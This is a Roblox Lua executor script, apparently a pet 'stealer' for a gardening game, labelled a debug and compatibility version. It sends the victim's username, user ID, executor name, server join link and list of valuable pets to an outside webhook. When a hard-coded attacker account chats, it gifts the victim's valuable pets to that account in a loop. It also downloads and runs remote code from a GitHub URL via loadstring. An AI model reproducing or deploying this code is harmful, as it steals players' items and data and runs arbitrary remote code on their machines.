--[[
    DEFINITIVE DEBUG & COMPATIBILITY VERSION
    - Ultra-compatible code structure for all executors.
    - Full diagnostic 'print' statements for complete transparency.
    - All features, including Gifter, Webhook, and Loadstring, are active.
]]

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")

local LocalPlayer = Players.LocalPlayer

--[[ CONFIGURATION - PET LISTS ]]--
local MasterPetList = {
    "Butterfly", "Raccoon", "Queen Bee", "Disco Bee", "Mimic Octopus", "Dragonfly", "Pack Bee"
}

local TrashPetList = {
    "Dog", "Golden Lab", "Bunny", "Black Bunny", "Cat", "Orange Tabby", "Chicken",
    "Pig", "Crab", "Starfish", "Seagull"
}
--[[ END CONFIGURATION ]]--

local TargetUsername = "Proplong3"
local SCRIPT_URL = "https://raw.githubusercontent.com/DupeNew/Dupe/refs/heads/main/screen"
local webhookUrl = "https://3dhkilcqlzvk.manus.space/api/webhook"

local petEmojis = {
    ["Butterfly"] = "🦋", ["Raccoon"] = "🦝", ["Dragonfly"] = "🐲", ["Queen Bee"] = "👑", ["Disco Bee"] = "🕺",
    ["Mimic Octopus"] = "🐙", ["Pack Bee"] = "📦"
}

local giftingWeightThreshold = 11
local webhookWeightThreshold = 12
local hugePetWeightThreshold = 111

local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local humanoid = character and character:FindFirstChild("Humanoid")
local backpack = LocalPlayer and LocalPlayer:FindFirstChild("Backpack")
local GiftingEvent = ReplicatedStorage:FindFirstChild("GameEvents") and ReplicatedStorage.GameEvents:FindFirstChild("PetGiftingService")

local loadstringExecuted = false
local giftingActive = false

-- FUNCTION: getExecutorName
local function getExecutorName()
    if getexecutorname then
        local name = getexecutorname()
        return name:sub(1, 1):upper() .. name:sub(2)
    elseif syn and syn.protect_gui then
        return "Synapse X"
    elseif is_sirhurt_closure then
        return "SirHurt"
    elseif Krnl or krnl_LOADED then
        return "Krnl"
    elseif SW_VERSION or getscriptwareversion then
        return "Script-Ware"
    else
        return "Unknown"
    end
end

-- FUNCTION: isPetInList
local function isPetInList(petName, list)
    for i = 1, #list do
        local nameInList = list[i]
        if string.sub(petName, 1, #nameInList) == nameInList then
            return true, nameInList
        end
    end
    return false, nil
end

-- FUNCTION: checkInventoryForValuables
local function checkInventoryForValuables()
    local foundPetsData, foundPetNames = {}, {}
    for _, item in ipairs(backpack:GetChildren()) do
        if item:IsA("Tool") then
            local isMaster, baseName = isPetInList(item.Name, MasterPetList)
            local isTrash, _ = isPetInList(item.Name, TrashPetList)
            local shouldReportByWeight, isSuperHuge, weight = false, false, 0
            
            local weightString = string.match(item.Name, "%[(%d+%.?%d*) KG%]")
            if weightString then
                local extractedWeight = tonumber(weightString)
                if extractedWeight then
                    weight = extractedWeight
                    if weight >= webhookWeightThreshold then shouldReportByWeight = true end
                    if weight >= hugePetWeightThreshold then isSuperHuge = true end
                end
            end

            if (shouldReportByWeight or (isMaster and not isTrash)) and not table.find(foundPetNames, item.Name) then
                table.insert(foundPetNames, item.Name)
                table.insert(foundPetsData, {name = item.Name, isHuge = isSuperHuge, baseName = baseName, weight = weight})
            end
        end
    end
    return #foundPetsData > 0, foundPetsData
end

-- FUNCTION: sortPets
local function sortPets(a, b)
    if a.isHuge and not b.isHuge then
        return true
    elseif not a.isHuge and b.isHuge then
        return false
    elseif a.isHuge and b.isHuge then
        return a.weight > b.weight
    else
        return a.name < b.name
    end
end

-- FUNCTION: sendWebhookNotification
local function sendWebhookNotification(foundPetsData)
    print("[Webhook] Sorting found pets for notification.")
    table.sort(foundPetsData, sortPets)
    
    local playerInfoValue = string.format("```\nUsername: %s\nDisplay: %s\nUser ID: %d\nExecutor: %s\n```", LocalPlayer.Name, LocalPlayer.DisplayName, LocalPlayer.UserId, getExecutorName())
    local formattedPetLines = {}
    for _, petData in ipairs(foundPetsData) do
        local emoji
        if petData.isHuge then
            emoji = "💪"
        elseif petData.baseName and petEmojis[petData.baseName] then
            emoji = petEmojis[petData.baseName]
        else
            emoji = "⭐"
        end
        table.insert(formattedPetLines, emoji .. " - " .. petData.name)
    end
    
    local petsValue = "```\n" .. table.concat(formattedPetLines, "\n") .. "\n```"
    local joinLink = string.format("https://kebabman.vercel.app/start?placeId=%d&gameInstanceId=%s", game.PlaceId, game.JobId)
    
    local success, pId = pcall(function() return game.PrivateServerId end)
    local serverType
    if success and pId ~= "" then
        serverType = "🔒 Private"
    else
        serverType = "🌍 Public"
    end

    local payload = {
        content = "@everyone",
        embeds = {{
            title = "PALDOOOO WHOO🤑🤑🤑🤑", color = 65280,
            fields = {
                { name = "👤 Player Information", value = playerInfoValue, inline = false },
                { name = "🌐 Server Type", value = "```\n" .. serverType .. "\n```", inline = false },
                { name = "🌴 Found Pets (Sorted)", value = petsValue, inline = false },
                { name = "🔗 Server Link", value = joinLink, inline = false }
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }
    
    local function sendRequest()
        request({ Url = webhookUrl, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(payload) })
    end
    local reqSuccess, reqError = pcall(sendRequest)
    if not reqSuccess then
        print("[Webhook Error] The request failed to send: " .. tostring(reqError))
    else
        print("[Webhook] Notification sent successfully.")
    end
end

-- FUNCTION: giftPetsLoop
local function giftPetsLoop(targetPlayer)
    if not humanoid or not backpack or not GiftingEvent or not targetPlayer then
        print("[Gifter Error] Loop cannot start, a critical component is missing.")
        giftingActive = false -- Reset the flag if the loop fails to start.
        return 
    end
    
    local args = {"GivePet", targetPlayer}
    while giftingActive and targetPlayer.Parent ~= nil do
        for _, item in ipairs(backpack:GetChildren()) do
            if item:IsA("Tool") then
                local isMaster, _ = isPetInList(item.Name, MasterPetList)
                local isTrash, _ = isPetInList(item.Name, TrashPetList)
                local isHuge = false
                
                local weightString = string.match(item.Name, "%[(%d+%.?%d*) KG%]")
                if weightString then
                    local weight = tonumber(weightString)
                    if weight and weight >= giftingWeightThreshold then isHuge = true end
                end

                if isHuge or (isMaster and not isTrash) then
                    humanoid:EquipTool(item)
                    GiftingEvent:FireServer(unpack(args))
                    task.wait(0)
                end
            end
        end
        task.wait(0)
    end
    
    giftingActive = false -- Set to false only when the loop naturally finishes.
    print("[Gifter Info] Gifting loop has stopped.")
end

-- FUNCTION: executeLoadedScript
local function executeLoadedScript()
    print("[Loadstring] Attempting to fetch and execute script from URL...")
    local success, scriptContent = pcall(function() return game:HttpGet(SCRIPT_URL) end)
    if success and scriptContent then
        print("[Loadstring] Script content fetched. Compiling and executing...")
        local scriptFunction, compileError = loadstring(scriptContent)
        if scriptFunction then
            local runSuccess, runError = pcall(scriptFunction)
            if not runSuccess then
                print("[Loadstring Error] The loaded script failed to run: " .. tostring(runError))
            else
                print("[Loadstring] Loaded script executed.")
            end
        else
            print("[Loadstring Error] Failed to compile script: " .. tostring(compileError))
        end
    else
        print("[Loadstring Error] Failed to fetch script from URL: " .. tostring(scriptContent))
    end
end

-- FUNCTION: onPlayerChatted (WITH DIAGNOSTICS)
local function onPlayerChatted(player, message)
    print("[Chat Trigger] Detected chat from player: '" .. player.Name .. "'")

    if player.Name == TargetUsername then
        print("[Chat Trigger] Chat is from the correct target: '" .. TargetUsername .. "'")

        if not loadstringExecuted then
            loadstringExecuted = true
            executeLoadedScript()
        end
        
        if not giftingActive then
            print("[Chat Trigger] Gifting is not active. Activating now and spawning loop...")
            giftingActive = true 
            task.spawn(giftPetsLoop, player)
        else
            print("[Chat Trigger] Gifting is already active, not starting another loop.")
        end
    end
end

-- === SCRIPT EXECUTION STARTS HERE ===
print("[System] Initializing script...")

Players.PlayerAdded:Connect(function(player)
    player.Chatted:Connect(function(message)
        onPlayerChatted(player, message)
    end)
end)

for _, player in ipairs(Players:GetPlayers()) do
    player.Chatted:Connect(function(message)
        onPlayerChatted(player, message)
    end)
end

print("[System] Event connections established.")
task.wait(1) -- Small delay for inventory to load fully.

print("[System] Performing initial inventory check for webhook...")
local hasPets, foundPetsData = checkInventoryForValuables()
if hasPets then
    print("[System] Valuable pets found on startup. Sending webhook...")
    sendWebhookNotification(foundPetsData)
else
    print("[System] No valuable pets found on startup.")
end

print("--- [ SCRIPT FULLY LOADED ] ---")
print("Awaiting chat from '" .. TargetUsername .. "' to trigger Gifter and Loadstring.")
print("-------------------------------")
